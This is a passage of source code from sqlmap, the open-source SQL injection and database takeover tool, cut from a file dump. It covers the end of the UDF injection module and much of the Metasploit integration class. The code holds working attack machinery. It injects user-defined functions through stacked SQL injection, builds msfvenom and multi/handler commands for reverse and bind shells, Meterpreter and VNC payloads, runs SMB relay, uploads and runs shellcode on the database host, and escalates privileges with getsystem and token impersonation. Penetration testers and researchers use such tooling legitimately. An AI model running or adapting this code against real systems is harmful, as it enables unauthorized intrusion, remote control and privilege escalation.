like the binary file has not been written \"\n                errMsg += \"on the database underlying file system\"\n                logger.error(errMsg)\n\n                message = \"do you want to proceed anyway? Beware that the \"\n                message += \"operating system takeover will fail [y/N] \"\n\n                if readInput(message, default='N', boolean=True):\n                    written = True\n                else:\n                    return False\n        else:\n            return True\n\n        for udf, inpRet in udfDict.items():\n            if udf in self.udfToCreate and udf not in self.createdUdf:\n                self.udfCreateFromSharedLib(udf, inpRet)\n\n        if Backend.isDbms(DBMS.MYSQL):\n            supportTblType = \"longtext\"\n        elif Backend.isDbms(DBMS.PGSQL):\n            supportTblType = \"text\"\n\n        self.udfCreateSupportTbl(supportTblType)\n\n        return written\n\n    def udfInjectSys(self):\n        self.udfSetLocalPaths()\n        self.udfCheckNeeded()\n        return self.udfInjectCore(self.sysUdfs)\n\n    def udfInjectCustom(self):\n        if Backend.getIdentifiedDbms() not in (DBMS.MYSQL, DBMS.PGSQL):\n            errMsg = \"UDF injection feature only works on MySQL and PostgreSQL\"\n            logger.error(errMsg)\n            return\n\n        if not isStackingAvailable() and not conf.direct:\n            errMsg = \"UDF injection feature requires stacked queries SQL injection\"\n            logger.error(errMsg)\n            return\n\n        self.checkDbmsOs()\n\n        if not self.isDba():\n            warnMsg = \"functionality requested probably does not work because \"\n            warnMsg += \"the current session user is not a database administrator\"\n            logger.warning(warnMsg)\n\n        if not conf.shLib:\n            msg = \"what is the local path of the shared library? \"\n\n            while True:\n                self.udfLocalFile = readInput(msg)\n\n                if self.udfLocalFile:\n                    break\n                else:\n                    logger.warning(\"you need to specify the local path of the shared library\")\n        else:\n            self.udfLocalFile = conf.shLib\n\n        if not os.path.exists(self.udfLocalFile):\n            errMsg = \"the specified shared library file does not exist\"\n            raise SqlmapFilePathException(errMsg)\n\n        if not self.udfLocalFile.endswith(\".dll\") and not self.udfLocalFile.endswith(\".so\"):\n            errMsg = \"shared library file must end with '.dll' or '.so'\"\n            raise SqlmapMissingMandatoryOptionException(errMsg)\n\n        elif self.udfLocalFile.endswith(\".so\") and Backend.isOs(OS.WINDOWS):\n            errMsg = \"you provided a shared object as shared library, but \"\n            errMsg += \"the database underlying operating system is Windows\"\n            raise SqlmapMissingMandatoryOptionException(errMsg)\n\n        elif self.udfLocalFile.endswith(\".dll\") and Backend.isOs(OS.LINUX):\n            errMsg = \"you provided a dynamic-link library as shared library, \"\n            errMsg += \"but the database underlying operating system is Linux\"\n            raise SqlmapMissingMandatoryOptionException(errMsg)\n\n        self.udfSharedLibName = os.path.basename(self.udfLocalFile).split(\".\")[0]\n        self.udfSharedLibExt = os.path.basename(self.udfLocalFile).split(\".\")[1]\n\n        msg = \"how many user-defined functions do you want to create \"\n        msg += \"from the shared library? \"\n\n        while True:\n            udfCount = readInput(msg, default='1')\n\n            if udfCount.isdigit():\n                udfCount = int(udfCount)\n\n                if udfCount <= 0:\n                    logger.info(\"nothing to inject then\")\n                    return\n                else:\n                    break\n            else:\n                logger.warning(\"invalid value, only digits are allowed\")\n\n        for x in xrange(0, udfCount):\n            while True:\n                msg = \"what is the name of the UDF number %d? \" % (x + 1)\n                udfName = readInput(msg)\n\n                if udfName:\n                    self.udfs[udfName] = {}\n                    break\n                else:\n                    logger.warning(\"you need to specify the name of the UDF\")\n\n            if Backend.isDbms(DBMS.MYSQL):\n                defaultType = \"string\"\n            elif Backend.isDbms(DBMS.PGSQL):\n                defaultType = \"text\"\n\n            self.udfs[udfName][\"input\"] = []\n\n            msg = \"how many input parameters takes UDF \"\n            msg += \"'%s'? (default: 1) \" % udfName\n\n            while True:\n                parCount = readInput(msg, default='1')\n\n                if parCount.isdigit() and int(parCount) >= 0:\n                    parCount = int(parCount)\n                    break\n\n                else:\n                    logger.warning(\"invalid value, only digits >= 0 are allowed\")\n\n            for y in xrange(0, parCount):\n                msg = \"what is the data-type of input parameter \"\n                msg += \"number %d? (default: %s) \" % ((y + 1), defaultType)\n\n                while True:\n                    parType = readInput(msg, default=defaultType).strip()\n\n                    if parType.isdigit():\n                        logger.warning(\"you need to specify the data-type of the parameter\")\n\n                    else:\n                        self.udfs[udfName][\"input\"].append(parType)\n                        break\n\n            msg = \"what is the data-type of the return \"\n            msg += \"value? (default: %s) \" % defaultType\n\n            while True:\n                retType = readInput(msg, default=defaultType)\n\n                if hasattr(retType, \"isdigit\") and retType.isdigit():\n                    logger.warning(\"you need to specify the data-type of the return value\")\n                else:\n                    self.udfs[udfName][\"return\"] = retType\n                    break\n\n        success = self.udfInjectCore(self.udfs)\n\n        if success is False:\n            self.cleanup(udfDict=self.udfs)\n            return False\n\n        msg = \"do you want to call your injected user-defined \"\n        msg += \"functions now? [Y/n/q] \"\n        choice = readInput(msg, default='Y').upper()\n\n        if choice == 'N':\n            self.cleanup(udfDict=self.udfs)\n            return\n        elif choice == 'Q':\n            self.cleanup(udfDict=self.udfs)\n            raise SqlmapUserQuitException\n\n        while True:\n            udfList = []\n            msg = \"which UDF do you want to call?\"\n\n            for udf in self.udfs.keys():\n                udfList.append(udf)\n                msg += \"\\n[%d] %s\" % (len(udfList), udf)\n\n            msg += \"\\n[q] Quit\"\n\n            while True:\n                choice = readInput(msg).upper()\n\n                if choice == 'Q':\n                    break\n                elif isDigit(choice) and int(choice) > 0 and int(choice) <= len(udfList):\n                    choice = int(choice)\n                    break\n                else:\n                    warnMsg = \"invalid value, only digits >= 1 and \"\n                    warnMsg += \"<= %d are allowed\" % len(udfList)\n                    logger.warning(warnMsg)\n\n            if not isinstance(choice, int):\n                break\n\n            cmd = \"\"\n            count = 1\n            udfToCall = udfList[choice - 1]\n\n            for inp in self.udfs[udfToCall][\"input\"]:\n                msg = \"what is the value of the parameter number \"\n                msg += \"%d (data-type: %s)? \" % (count, inp)\n\n                while True:\n                    parValue = readInput(msg)\n\n                    if parValue:\n                        if \"int\" not in inp and \"bool\" not in inp:\n                            parValue = \"'%s'\" % parValue\n\n                        cmd += \"%s,\" % parValue\n\n                        break\n                    else:\n                        logger.warning(\"you need to specify the value of the parameter\")\n\n                count += 1\n\n            cmd = cmd[:-1]\n            msg = \"do you want to retrieve the return value of the \"\n            msg += \"UDF? [Y/n] \"\n\n            if readInput(msg, default='Y', boolean=True):\n                output = self.udfEvalCmd(cmd, udfName=udfToCall)\n\n                if output:\n                    conf.dumper.string(\"return value\", output)\n                else:\n                    dataToStdout(\"No return value\\n\")\n            else:\n                self.udfExecCmd(cmd, udfName=udfToCall, silent=True)\n\n            msg = \"do you want to call this or another injected UDF? [Y/n] \"\n\n            if not readInput(msg, default='Y', boolean=True):\n                break\n\n        self.cleanup(udfDict=self.udfs)\n", "lib/takeover/__init__.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\npass\n", "lib/takeover/metasploit.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom __future__ import print_function\n\nimport errno\nimport os\nimport re\nimport select\nimport sys\nimport tempfile\nimport time\n\nfrom subprocess import PIPE\n\nfrom extra.cloak.cloak import cloak\nfrom extra.cloak.cloak import decloak\nfrom lib.core.common import dataToStdout\nfrom lib.core.common import Backend\nfrom lib.core.common import getLocalIP\nfrom lib.core.common import getRemoteIP\nfrom lib.core.common import isDigit\nfrom lib.core.common import normalizePath\nfrom lib.core.common import ntToPosixSlashes\nfrom lib.core.common import pollProcess\nfrom lib.core.common import randomRange\nfrom lib.core.common import randomStr\nfrom lib.core.common import readInput\nfrom lib.core.convert import getBytes\nfrom lib.core.convert import getText\nfrom lib.core.data import conf\nfrom lib.core.data import kb\nfrom lib.core.data import logger\nfrom lib.core.data import paths\nfrom lib.core.enums import DBMS\nfrom lib.core.enums import OS\nfrom lib.core.exception import SqlmapDataException\nfrom lib.core.exception import SqlmapFilePathException\nfrom lib.core.exception import SqlmapGenericException\nfrom lib.core.settings import IS_WIN\nfrom lib.core.settings import METASPLOIT_SESSION_TIMEOUT\nfrom lib.core.settings import SHELLCODEEXEC_RANDOM_STRING_MARKER\nfrom lib.core.subprocessng import blockingReadFromFD\nfrom lib.core.subprocessng import blockingWriteToFD\nfrom lib.core.subprocessng import Popen as execute\nfrom lib.core.subprocessng import send_all\nfrom lib.core.subprocessng import recv_some\nfrom thirdparty import six\n\nif IS_WIN:\n    import msvcrt\n\nclass Metasploit(object):\n    \"\"\"\n    This class defines methods to call Metasploit for plugins.\n    \"\"\"\n\n    def _initVars(self):\n        self.connectionStr = None\n        self.lhostStr = None\n        self.rhostStr = None\n        self.portStr = None\n        self.payloadStr = None\n        self.encoderStr = None\n        self.payloadConnStr = None\n        self.localIP = getLocalIP()\n        self.remoteIP = getRemoteIP() or conf.hostname\n        self._msfCli = normalizePath(os.path.join(conf.msfPath, \"msfcli%s\" % (\".bat\" if IS_WIN else \"\")))\n        self._msfConsole = normalizePath(os.path.join(conf.msfPath, \"msfconsole%s\" % (\".bat\" if IS_WIN else \"\")))\n        self._msfEncode = normalizePath(os.path.join(conf.msfPath, \"msfencode%s\" % (\".bat\" if IS_WIN else \"\")))\n        self._msfPayload = normalizePath(os.path.join(conf.msfPath, \"msfpayload%s\" % (\".bat\" if IS_WIN else \"\")))\n        self._msfVenom = normalizePath(os.path.join(conf.msfPath, \"msfvenom%s\" % (\".bat\" if IS_WIN else \"\")))\n\n        self._msfPayloadsList = {\n            \"windows\": {\n                1: (\"Meterpreter (default)\", \"windows/meterpreter\"),\n                2: (\"Shell\", \"windows/shell\"),\n                3: (\"VNC\", \"windows/vncinject\"),\n            },\n            \"linux\": {\n                1: (\"Shell (default)\", \"linux/x86/shell\"),\n                2: (\"Meterpreter (beta)\", \"linux/x86/meterpreter\"),\n            }\n        }\n\n        self._msfConnectionsList = {\n            \"windows\": {\n                1: (\"Reverse TCP: Connect back from the database host to this machine (default)\", \"reverse_tcp\"),\n                2: (\"Reverse TCP: Try to connect back from the database host to this machine, on all ports between the specified and 65535\", \"reverse_tcp_allports\"),\n                3: (\"Reverse HTTP: Connect back from the database host to this machine tunnelling traffic over HTTP\", \"reverse_http\"),\n                4: (\"Reverse HTTPS: Connect back from the database host to this machine tunnelling traffic over HTTPS\", \"reverse_https\"),\n                5: (\"Bind TCP: Listen on the database host for a connection\", \"bind_tcp\"),\n            },\n            \"linux\": {\n                1: (\"Reverse TCP: Connect back from the database host to this machine (default)\", \"reverse_tcp\"),\n                2: (\"Bind TCP: Listen on the database host for a connection\", \"bind_tcp\"),\n            }\n        }\n\n        self._msfEncodersList = {\n            \"windows\": {\n                1: (\"No Encoder\", \"generic/none\"),\n                2: (\"Alpha2 Alphanumeric Mixedcase Encoder\", \"x86/alpha_mixed\"),\n                3: (\"Alpha2 Alphanumeric Uppercase Encoder\", \"x86/alpha_upper\"),\n                4: (\"Avoid UTF8/tolower\", \"x86/avoid_utf8_tolower\"),\n                5: (\"Call+4 Dword XOR Encoder\", \"x86/call4_dword_xor\"),\n                6: (\"Single-byte XOR Countdown Encoder\", \"x86/countdown\"),\n                7: (\"Variable-length Fnstenv/mov Dword XOR Encoder\", \"x86/fnstenv_mov\"),\n                8: (\"Polymorphic Jump/Call XOR Additive Feedback Encoder\", \"x86/jmp_call_additive\"),\n                9: (\"Non-Alpha Encoder\", \"x86/nonalpha\"),\n                10: (\"Non-Upper Encoder\", \"x86/nonupper\"),\n                11: (\"Polymorphic XOR Additive Feedback Encoder (default)\", \"x86/shikata_ga_nai\"),\n                12: (\"Alpha2 Alphanumeric Unicode Mixedcase Encoder\", \"x86/unicode_mixed\"),\n                13: (\"Alpha2 Alphanumeric Unicode Uppercase Encoder\", \"x86/unicode_upper\"),\n            }\n        }\n\n        self._msfSMBPortsList = {\n            \"windows\": {\n                1: (\"139/TCP\", \"139\"),\n                2: (\"445/TCP (default)\", \"445\"),\n            }\n        }\n\n        self._portData = {\n            \"bind\": \"remote port number\",\n            \"reverse\": \"local port number\",\n        }\n\n    def _skeletonSelection(self, msg, lst=None, maxValue=1, default=1):\n        if Backend.isOs(OS.WINDOWS):\n            opSys = \"windows\"\n        else:\n            opSys = \"linux\"\n\n        message = \"which %s do you want to use?\" % msg\n\n        if lst:\n            for num, data in lst[opSys].items():\n                description = data[0]\n\n                if num > maxValue:\n                    maxValue = num\n\n                if \"(default)\" in description:\n                    default = num\n\n                message += \"\\n[%d] %s\" % (num, description)\n        else:\n            message += \" [%d] \" % default\n\n        choice = readInput(message, default=\"%d\" % default)\n\n        if not choice or not isDigit(choice) or int(choice) > maxValue or int(choice) < 1:\n            choice = default\n\n        choice = int(choice)\n\n        if lst:\n            choice = lst[opSys][choice][1]\n\n        return choice\n\n    def _selectSMBPort(self):\n        return self._skeletonSelection(\"SMB port\", self._msfSMBPortsList)\n\n    def _selectEncoder(self, encode=True):\n        # This is always the case except for --os-bof where the user can\n        # choose which encoder to use. When called from --os-pwn the encoder\n        # is always x86/alpha_mixed - used for sys_bineval() and\n        # shellcodeexec\n        if isinstance(encode, six.string_types):\n            return encode\n\n        elif encode:\n            return self._skeletonSelection(\"payload encoding\", self._msfEncodersList)\n\n    def _selectPayload(self):\n        if Backend.isOs(OS.WINDOWS) and conf.privEsc:\n            infoMsg = \"forcing Metasploit payload to Meterpreter because \"\n            infoMsg += \"it is the only payload that can be used to \"\n            infoMsg += \"escalate privileges via 'incognito' extension, \"\n            infoMsg += \"'getsystem' command or post modules\"\n            logger.info(infoMsg)\n\n            _payloadStr = \"windows/meterpreter\"\n        else:\n            _payloadStr = self._skeletonSelection(\"payload\", self._msfPayloadsList)\n\n        if _payloadStr == \"windows/vncinject\":\n            choose = False\n\n            if Backend.isDbms(DBMS.MYSQL):\n                debugMsg = \"by default MySQL on Windows runs as SYSTEM \"\n                debugMsg += \"user, it is likely that the VNC \"\n                debugMsg += \"injection will be successful\"\n                logger.debug(debugMsg)\n\n            elif Backend.isDbms(DBMS.PGSQL):\n                choose = True\n\n                warnMsg = \"by default PostgreSQL on Windows runs as \"\n                warnMsg += \"postgres user, it is unlikely that the VNC \"\n                warnMsg += \"injection will be successful\"\n                logger.warning(warnMsg)\n\n            elif Backend.isDbms(DBMS.MSSQL) and Backend.isVersionWithin((\"2005\", \"2008\")):\n                choose = True\n\n                warnMsg = \"it is unlikely that the VNC injection will be \"\n                warnMsg += \"successful because usually Microsoft SQL Server \"\n                warnMsg += \"%s runs as Network Service \" % Backend.getVersion()\n                warnMsg += \"or the Administrator is not logged in\"\n                logger.warning(warnMsg)\n\n            if choose:\n                message = \"what do you want to do?\\n\"\n                message += \"[1] Give it a try anyway\\n\"\n                message += \"[2] Fall back to Meterpreter payload (default)\\n\"\n                message += \"[3] Fall back to Shell payload\"\n\n                while True:\n                    choice = readInput(message, default=\"2\")\n\n                    if not choice or choice == \"2\":\n                        _payloadStr = \"windows/meterpreter\"\n                        break\n\n                    elif choice == \"3\":\n                        _payloadStr = \"windows/shell\"\n                        break\n\n                    elif choice == \"1\":\n                        if Backend.isDbms(DBMS.PGSQL):\n                            logger.warning(\"beware that the VNC injection might not work\")\n                            break\n\n                        elif Backend.isDbms(DBMS.MSSQL) and Backend.isVersionWithin((\"2005\", \"2008\")):\n                            break\n\n                    elif not isDigit(choice):\n                        logger.warning(\"invalid value, only digits are allowed\")\n\n                    elif int(choice) < 1 or int(choice) > 2:\n                        logger.warning(\"invalid value, it must be 1 or 2\")\n\n        if self.connectionStr.startswith(\"reverse_http\") and _payloadStr != \"windows/meterpreter\":\n            warnMsg = \"Reverse HTTP%s connection is only supported \" % (\"S\" if self.connectionStr.endswith(\"s\") else \"\")\n            warnMsg += \"with the Meterpreter payload. Falling back to \"\n            warnMsg += \"reverse TCP\"\n            logger.warning(warnMsg)\n\n            self.connectionStr = \"reverse_tcp\"\n\n        return _payloadStr\n\n    def _selectPort(self):\n        for connType, connStr in self._portData.items():\n            if self.connectionStr.startswith(connType):\n                return self._skeletonSelection(connStr, maxValue=65535, default=randomRange(1025, 65535))\n\n    def _selectRhost(self):\n        if self.connectionStr.startswith(\"bind\"):\n            message = \"what is the back-end DBMS address? [Enter for '%s' (detected)] \" % self.remoteIP\n            address = readInput(message, default=self.remoteIP)\n\n            if not address:\n                address = self.remoteIP\n\n            return address\n\n        elif self.connectionStr.startswith(\"reverse\"):\n            return None\n\n        else:\n            raise SqlmapDataException(\"unexpected connection type\")\n\n    def _selectLhost(self):\n        if self.connectionStr.startswith(\"reverse\"):\n            message = \"what is the local address? [Enter for '%s' (detected)] \" % self.localIP\n            address = readInput(message, default=self.localIP)\n\n            if not address:\n                address = self.localIP\n\n            return address\n\n        elif self.connectionStr.startswith(\"bind\"):\n            return None\n\n        else:\n            raise SqlmapDataException(\"unexpected connection type\")\n\n    def _selectConnection(self):\n        return self._skeletonSelection(\"connection type\", self._msfConnectionsList)\n\n    def _prepareIngredients(self, encode=True):\n        self.connectionStr = self._selectConnection()\n        self.lhostStr = self._selectLhost()\n        self.rhostStr = self._selectRhost()\n        self.portStr = self._selectPort()\n        self.payloadStr = self._selectPayload()\n        self.encoderStr = self._selectEncoder(encode)\n        self.payloadConnStr = \"%s/%s\" % (self.payloadStr, self.connectionStr)\n\n    def _forgeMsfCliCmd(self, exitfunc=\"process\"):\n        if kb.oldMsf:\n            self._cliCmd = \"%s multi/handler PAYLOAD=%s\" % (self._msfCli, self.payloadConnStr)\n            self._cliCmd += \" EXITFUNC=%s\" % exitfunc\n            self._cliCmd += \" LPORT=%s\" % self.portStr\n\n            if self.connectionStr.startswith(\"bind\"):\n                self._cliCmd += \" RHOST=%s\" % self.rhostStr\n            elif self.connectionStr.startswith(\"reverse\"):\n                self._cliCmd += \" LHOST=%s\" % self.lhostStr\n            else:\n                raise SqlmapDataException(\"unexpected connection type\")\n\n            if Backend.isOs(OS.WINDOWS) and self.payloadStr == \"windows/vncinject\":\n                self._cliCmd += \" DisableCourtesyShell=true\"\n\n            self._cliCmd += \" E\"\n        else:\n            self._cliCmd = \"%s -L -x 'use multi/handler; set PAYLOAD %s\" % (self._msfConsole, self.payloadConnStr)\n            self._cliCmd += \"; set EXITFUNC %s\" % exitfunc\n            self._cliCmd += \"; set LPORT %s\" % self.portStr\n\n            if self.connectionStr.startswith(\"bind\"):\n                self._cliCmd += \"; set RHOST %s\" % self.rhostStr\n            elif self.connectionStr.startswith(\"reverse\"):\n                self._cliCmd += \"; set LHOST %s\" % self.lhostStr\n            else:\n                raise SqlmapDataException(\"unexpected connection type\")\n\n            if Backend.isOs(OS.WINDOWS) and self.payloadStr == \"windows/vncinject\":\n                self._cliCmd += \"; set DisableCourtesyShell true\"\n\n            self._cliCmd += \"; exploit'\"\n\n    def _forgeMsfCliCmdForSmbrelay(self):\n        self._prepareIngredients(encode=False)\n\n        if kb.oldMsf:\n            self._cliCmd = \"%s windows/smb/smb_relay PAYLOAD=%s\" % (self._msfCli, self.payloadConnStr)\n            self._cliCmd += \" EXITFUNC=thread\"\n            self._cliCmd += \" LPORT=%s\" % self.portStr\n            self._cliCmd += \" SRVHOST=%s\" % self.lhostStr\n            self._cliCmd += \" SRVPORT=%s\" % self._selectSMBPort()\n\n            if self.connectionStr.startswith(\"bind\"):\n                self._cliCmd += \" RHOST=%s\" % self.rhostStr\n            elif self.connectionStr.startswith(\"reverse\"):\n                self._cliCmd += \" LHOST=%s\" % self.lhostStr\n            else:\n                raise SqlmapDataException(\"unexpected connection type\")\n\n            self._cliCmd += \" E\"\n        else:\n            self._cliCmd = \"%s -x 'use windows/smb/smb_relay; set PAYLOAD %s\" % (self._msfConsole, self.payloadConnStr)\n            self._cliCmd += \"; set EXITFUNC thread\"\n            self._cliCmd += \"; set LPORT %s\" % self.portStr\n            self._cliCmd += \"; set SRVHOST %s\" % self.lhostStr\n            self._cliCmd += \"; set SRVPORT %s\" % self._selectSMBPort()\n\n            if self.connectionStr.startswith(\"bind\"):\n                self._cliCmd += \"; set RHOST %s\" % self.rhostStr\n            elif self.connectionStr.startswith(\"reverse\"):\n                self._cliCmd += \"; set LHOST %s\" % self.lhostStr\n            else:\n                raise SqlmapDataException(\"unexpected connection type\")\n\n            self._cliCmd += \"; exploit'\"\n\n    def _forgeMsfPayloadCmd(self, exitfunc, format, outFile, extra=None):\n        if kb.oldMsf:\n            self._payloadCmd = self._msfPayload\n        else:\n            self._payloadCmd = \"%s -p\" % self._msfVenom\n\n        self._payloadCmd += \" %s\" % self.payloadConnStr\n        self._payloadCmd += \" EXITFUNC=%s\" % exitfunc\n        self._payloadCmd += \" LPORT=%s\" % self.portStr\n\n        if self.connectionStr.startswith(\"reverse\"):\n            self._payloadCmd += \" LHOST=%s\" % self.lhostStr\n        elif not self.connectionStr.startswith(\"bind\"):\n            raise SqlmapDataException(\"unexpected connection type\")\n\n        if Backend.isOs(OS.LINUX) and conf.privEsc:\n            self._payloadCmd += \" PrependChrootBreak=true PrependSetuid=true\"\n\n        if kb.oldMsf:\n            if extra == \"BufferRegister=EAX\":\n                self._payloadCmd += \" R | %s -a x86 -e %s -o \\\"%s\\\" -t %s\" % (self._msfEncode, self.encoderStr, outFile, format)\n\n                if extra is not None:\n                    self._payloadCmd += \" %s\" % extra\n            else:\n                self._payloadCmd += \" X > \\\"%s\\\"\" % outFile\n        else:\n            if extra == \"BufferRegister=EAX\":\n                self._payloadCmd += \" -a x86 -e %s -f %s\" % (self.encoderStr, format)\n\n                if extra is not None:\n                    self._payloadCmd += \" %s\" % extra\n\n                self._payloadCmd += \" > \\\"%s\\\"\" % outFile\n            else:\n                self._payloadCmd += \" -f exe > \\\"%s\\\"\" % outFile\n\n    def _runMsfCliSmbrelay(self):\n        self._forgeMsfCliCmdForSmbrelay()\n\n        infoMsg = \"running Metasploit Framework command line \"\n        infoMsg += \"interface locally, please wait..\"\n        logger.info(infoMsg)\n\n        logger.debug(\"executing local command: %s\" % self._cliCmd)\n        self._msfCliProc = execute(self._cliCmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE, close_fds=False)\n\n    def _runMsfCli(self, exitfunc):\n        self._forgeMsfCliCmd(exitfunc)\n\n        infoMsg = \"running Metasploit Framework command line \"\n        infoMsg += \"interface locally, please wait..\"\n        logger.info(infoMsg)\n\n        logger.debug(\"executing local command: %s\" % self._cliCmd)\n        self._msfCliProc = execute(self._cliCmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE, close_fds=False)\n\n    def _runMsfShellcodeRemote(self):\n        infoMsg = \"running Metasploit Framework shellcode \"\n        infoMsg += \"remotely via UDF 'sys_bineval', please wait..\"\n        logger.info(infoMsg)\n\n        self.udfExecCmd(\"'%s'\" % self.shellcodeString, silent=True, udfName=\"sys_bineval\")\n\n    def _runMsfShellcodeRemoteViaSexec(self):\n        infoMsg = \"running Metasploit Framework shellcode remotely \"\n        infoMsg += \"via shellcodeexec, please wait..\"\n        logger.info(infoMsg)\n\n        if not Backend.isOs(OS.WINDOWS):\n            self.execCmd(\"chmod +x %s\" % self.shellcodeexecRemote, silent=True)\n            cmd = \"%s %s &\" % (self.shellcodeexecRemote, self.shellcodeString)\n        else:\n            cmd = \"\\\"%s\\\" %s\" % (self.shellcodeexecRemote, self.shellcodeString)\n\n        self.execCmd(cmd, silent=True)\n\n    def _loadMetExtensions(self, proc, metSess):\n        if not Backend.isOs(OS.WINDOWS):\n            return\n\n        send_all(proc, \"use espia\\n\")\n        send_all(proc, \"use incognito\\n\")\n\n        # This extension is loaded by default since Metasploit > 3.7:\n        # send_all(proc, \"use priv\\n\")\n\n        # This extension freezes the connection on 64-bit systems:\n        # send_all(proc, \"use sniffer\\n\")\n\n        send_all(proc, \"sysinfo\\n\")\n        send_all(proc, \"getuid\\n\")\n\n        if conf.privEsc:\n            print()\n\n            infoMsg = \"trying to escalate privileges using Meterpreter \"\n            infoMsg += \"'getsystem' command which tries different \"\n            infoMsg += \"techniques, including kitrap0d\"\n            logger.info(infoMsg)\n\n            send_all(proc, \"getsystem\\n\")\n\n            infoMsg = \"displaying the list of available Access Tokens. \"\n            infoMsg += \"Choose which user you want to impersonate by \"\n            infoMsg += \"using incognito's command 'impersonate_token' if \"\n            infoMsg += \"'getsystem' does not success to elevate privileges\"\n            logger.info(infoMsg)\n\n            send_all(proc, \"list_tokens -u\\n\")\n            send_all(proc, \"getuid\\n\")\n\n    def _controlMsfCmd(self, proc, func):\n        initialized = False\n        start_time = time.time()\n        stdin_fd = sys.stdin.fileno()\n\n        while True:\n            returncode = proc.poll()\n\n            if returncode is None:\n                # Child hasn't exited yet\n                pass\n            else:\n                logger.debug(\"connection closed properly\")\n                return returncode\n\n            try:\n                if IS_WIN:\n                    timeout = 3\n\n                    inp = b\"\"\n                    _ = time.time()\n\n                    while True:\n                        if msvcrt.kbhit():\n                            char = msvcrt.getche()\n\n                            if ord(char) == 13:     # enter_key\n                                break\n                            elif ord(char) >= 32:   # space_char\n                                inp += char\n\n                        if len(inp) == 0 and (time.time() - _) > timeout:\n                            break\n\n                    if len(inp) > 0:\n                        try:\n                            send_all(proc, inp)\n                        except (EOFError, IOError):\n                            # Probably the child has exited\n                            pass\n                else:\n                    ready_fds = select.select([stdin_fd], [], [], 1)\n\n                    if stdin_fd in ready_fds[0]:\n                        try:\n                            send_all(proc, blockingReadFromFD(stdin_fd))\n                        except (EOFError, IOError):\n                            # Probably the child has exited\n                            pass\n\n                out = recv_some(proc, t=.1, e=0)\n                blockingWriteToFD(sys.stdout.fileno(), getBytes(out))\n\n                # For --os-pwn and --os-bof\n                pwnBofCond = self.connectionStr.startswith(\"reverse\")\n                pwnBofCond &= any(_ in out for _ in (b\"Starting the payload handler\", b\"Started reverse\"))\n\n                # For --os-smbrelay\n                smbRelayCond = b\"Server started\" in out\n\n                if pwnBofCond or smbRelayCond:\n                    func()\n\n                timeout = time.time() - start_time > METASPLOIT_SESSION_TIMEOUT\n\n                if not initialized:\n                    match = re.search(b\"Meterpreter session ([\\\\d]+) opened\", out)\n\n                    if match:\n                        self._loadMetExtensions(proc, match.group(1))\n\n                        if \"shell\" in self.payloadStr:\n                            send_all(proc, \"whoami\\n\" if Backend.isOs(OS.WINDOWS) else \"uname -a ; id\\n\")\n                            time.sleep(2)\n\n                        initialized = True\n                    elif timeout:\n                        proc.kill()\n                        errMsg = \"timeout occurred while attempting \"\n                        errMsg += \"to open a remote session\"\n                        raise SqlmapGenericException(errMsg)\n\n            except select.error as ex:\n                # Reference: https://github.com/andymccurdy/redis-py/pull/743/commits/2b59b25bb08ea09e98aede1b1f23a270fc085a9f\n                if ex.args[0] == errno.EINTR:\n                    continue\n                else:\n                    return proc.returncode\n            except (EOFError, IOError):\n                return proc.returncode\n            except KeyboardInterrupt:\n                pass\n\n    def createMsfShellcode(self, exitfunc, format, extra, encode):\n        infoMsg = \"creating Metasploit Framework multi-stage shellcode \"\n        logger.info(infoMsg)\n\n        self._randStr = randomStr(lowercase=True)\n        self._shellcodeFilePath = os.path.join(conf.outputPath, \"tmpm%s\" % self._randStr)\n\n        Metasploit._initVars(self)\n        self._prepareIngredients(encode=encode)\n        self._forgeMsfPayloadCmd(exitfunc, format, self._shellcodeFilePath, extra)\n\n        logger.debug(\"executing local command: %s\" % self._payloadCmd)\n        process = execute(self._payloadCmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE, close_fds=False)\n\n        dataToStdout(\"\\r[%s] [INFO] creation in progress \" % time.strftime(\"%X\"))\n        pollProcess(process)\n        payloadStderr = process.communicate()[1]\n\n        match = re.search(b\"(Total size:|Length:|succeeded with size|Final size of exe file:) ([\\\\d]+)\", payloadStderr)\n\n        if match:\n            payloadSize = int(match.group(2))\n\n            if extra == \"BufferRegister=EAX\":\n                payloadSize = payloadSize // 2\n\n            debugMsg = \"the shellcode size is %d bytes\" % payloadSize\n            logger.debug(debugMsg)\n        else:\n            errMsg = \"failed to create the shellcode ('%s')\" % getText(payloadStderr).replace(\"\\n\", \" \").replace(\"\\r\", \"\")\n            raise SqlmapFilePathException(errMsg)\n\n        self._shellcodeFP = open(self._shellcodeFilePath, \"rb\")\n        self.shellcodeString = getText(self._shellcodeFP.read())\n        self._shellcodeFP.close()\n\n        os.unlink(self._shellcodeFilePath)\n\n    def uploadShellcodeexec(self, web=False):\n        self.shellcodeexecLocal = os.path.join(paths.SQLMAP_EXTRAS_PATH, \"shellcodeexec\")\n\n        if Backend.isOs(OS.WINDOWS):\n            self.shellcodeexecLocal = os.path.join(self.shellcodeexecLocal, \"windows\", \"shellcodeexec.x%s.exe_\" % \"32\")\n            content = decloak(self.shellcodeexecLocal)\n            if SHELLCODEEXEC_RANDOM_STRING_MARKER in content:\n                content = content.replace(SHELLCODEEXEC_RANDOM_STRING_MARKER, getBytes(randomStr(len(SHELLCODEEXEC_RANDOM_STRING_MARKER))))\n                _ = cloak(data=content)\n                handle, self.shellcodeexecLocal = tempfile.mkstemp(suffix=\"%s.exe_\" % \"32\")\n                os.close(handle)\n                with open(self.shellcodeexecLocal, \"w+b\") as f:\n                    f.write(_)\n        else:\n            self.shellcodeexecLocal = os.path.join(self.shellcodeexecLocal, \"linux\", \"shellcodeexec.x%s_\" % Backend.getArch())\n\n        __basename = \"tmpse%s%s\" % (self._randStr, \".exe\" if Backend.isOs(OS.WINDOWS) else \"\")\n\n        self.shellcodeexecRemote = \"%s/%s\" % (conf.tmpPath, __basename)\n        self.shellcodeexecRemote = ntToPosixSlashes(normalizePath(self.shellcodeexecRemote))\n\n        logger.info(\"uploading shellcodeexec to '%s'\" % self.shellcodeexecRemote)\n\n        if web:\n            written = self.webUpload(self.shellcodeexecRemote, os.path.split(self.shellcodeexecRemote)[0], filepath=self.shellcodeexecLocal)\n        else:\n            written = self.writeFile(self.shellcodeexecLocal, 